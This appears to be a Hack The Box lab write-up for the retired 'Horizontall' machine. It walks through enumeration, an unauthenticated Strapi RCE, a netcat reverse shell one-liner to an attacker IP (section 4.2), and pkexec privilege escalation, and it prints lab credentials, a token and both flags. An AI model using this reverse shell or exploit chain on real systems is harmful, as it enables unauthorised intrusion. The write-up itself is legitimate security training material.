---
title: "HTB Horizontall Writeup"
date: 2022-02-04T22:14:31+05:30
tags: ['Easy', 'Linux', 'Retired']
categories: ['Linux Easy']

resources:
- name: "horizontall"
  src: "horizontall.jpeg"

draft: false
---

{{< figure src="/images/horizontall.jpeg" title="Horizontall" >}}
# Process
* Carried out an nmap scan found two ports open 
	* 22/tcp open ssh
	* 80/tcp open http
*	The ssh version was not vulnerable.
*	The webpage at horizontal.htb was static and no actionable/useful OSINT was present 
*	Directory enumeration carried out using two wordlists
	*	dirb/common.txt
	*	dirbuster/subdirectory-list-2.3-medium.txt
	*	No interesting subdirectories.
*	Subsequently vhost enumeration was carried out.
	*	~*api-prod*~ subdomain found.
	*	Directory enumeration again carried out. Directories found: 
		*	admin
		*	reviews
		*	users
		*	connect
		*	etc
	*  index.html was again a static webpage. The /admin subdirectory was intresting. 
	*  It had a strapi pannel. The strapi application is vulnerable to unauthenticated RCE
	*  Using the exploit. An admin account was created 
		*  credentials admin:SuperSecretPasssword1
* The exploit also gave access to console for RCE. The consle did not return any ouput for the commands to verify the commands were being executed. I tested out for **Blind RCE**. 
* Started a python webserver on my machine. Sent a GET Request using the console to my webserver. It confirmed existence of Blind RCE.
* I levereaged the console to get a reverse netcat shell
* Subsequently stablized the shell and read the user flag



*   Privilege Escalation
    *   Used the LinPeas.sh to enumerate the system found it vulnerable to CVE-2021-4034.
    *	 Found an [exploit](https://github.com/arthepsy/CVE-2021-4034.git)
    *	 Executed it and escalated to root.
    *	 Et voila read the root.txt.
    
 ## 1. Enumeration
 ### 1.1 Nmap 
* 80/tcp open  http    nginx 1.14.0 (Ubuntu) 
*  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
* No UDP port open

```bash
sudo nmap -sC -A -Pn 10.129.161.165 -T4 -oN nmap.ad
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-03 23:44 IST
Nmap scan report for horizontall.htb (10.129.161.165)
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/3%OT=22%CT=1%CU=40479%PV=Y%DS=2%DC=T%G=Y%TM=61FC1B9A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   197.81 ms 10.10.14.1
2   201.86 ms horizontall.htb (10.129.161.165)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.66 seconds
```

### 1.2 Directory Enumeration

```bash
ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -of ffuf/horz.common.md

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 901, Words: 43, Lines: 2]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
favicon.ico             [Status: 200, Size: 4286, Words: 8, Lines: 1]
img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
index.html              [Status: 200, Size: 901, Words: 43, Lines: 2]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
:: Progress: [4614/4614] :: Job [1/1] :: 262 req/sec :: Duration: [0:00:21] :: Errors: 0 :
```

### 1.3 Vhost Enumeration
```bash
ffuf -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -of md -o vhost.horz -fs 194

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Output file      : vhost.horz
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 194
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]
```

## 2. {?h}ttp://horizonal.htb
{{<figure src="/images/horizontall-homepage.png" title="Homepage">}}
* Static website 
* No actionable or useful OSINT

## 3. api{?.}-prod{?.}-horizontall{?.}htb
### 3.1 Homepage
![[Pasted image 20220204003329.png]]
### 3.2 Directory Enumeration
* admin, ADMIN, Admin
* users
* connect
* robots.txt
* index.html
```bash
ffuf -u http://api-prod.horizontall.htb/FUZZ/ -w /usr/share/wordlists/dirb/common.txt  -of md -o dir.api-prod.horz.common

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://api-prod.horizontall.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Output file      : dir.api-prod.horz.common
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 413, Words: 76, Lines: 20]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
connect                 [Status: 403, Size: 60, Words: 1, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
:: Progress: [4614/4614] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

### 3.3 Login portal
{{<figure src="/images/horizontall-strapi.png" title="Login Portal">}}

### 3.4 Vulnerability
* [Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) - Multiple webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/50239)
{{<figure src="/images/horizontall-strapi-version.png" title="Version Identification">}}

## 4. Foothold

### 4.1 Shell
{{<figure src="/images/horizontall-footholda.png" title="Blind RCE">}}

```bash
+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTUyNzU2LCJleHAiOjE2NDY1NDQ3NTZ9.ucoeJpyivBWFaRCG8IAmfXUEH_2Q0emD9yBqckOkmfI
```

It does work as I looged GET request on  web server. I had to do this to ensure that blind RCE was working. 

{{<figure src="/images/horizontall-footholdb.png" title="Verifing Blind RCE">}}

### 4.2 Reverse Shell

* Shell used 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 4242 >/tmp/f
```
{{<figure src="/images/horizontall_revshell.png" title="Reverse Shell">}}

### 4.3 User Flag
{{<figure src="/images/horizontall_uf.png" title="User Flag">}}

```bash
1e76ca9ddad1b45992f9701539d9ce9b
```

## 5. Privilege Escalation

* pkexec vulnerable using Linpeas

{{<figure src="/images/horizontall_pv_1.png" title="LinPEAS output">}}

## 5.1 Exploit

[Exploit used](https://github.com/arthepsy/CVE-2021-4034.git)

* Uploaded file using the strapi panel (credentials from Foothold exploit admin:SuperSecretPassword1) 
{{<figure src="/images/horizontall_pv_2.png" title="">}}

* Compile the exploit
{{<figure src="/images/horizontall_pv_3.png" title="Compiling the exploit">}}

*	Execute exploit
{{<figure src="/images/horizontall_pv_4.png" title="Executing the exploit">}}

## 5.2 Root Flag
Et voila
{{<figure src="/images/horizontall_pv_5.png" title="Hehehe! And all this you were busy thinking we wouldn't be able to do this">}}

```bash
# cat root.txt
e1581bd68329ddd2aacdfb01631ab02d
```

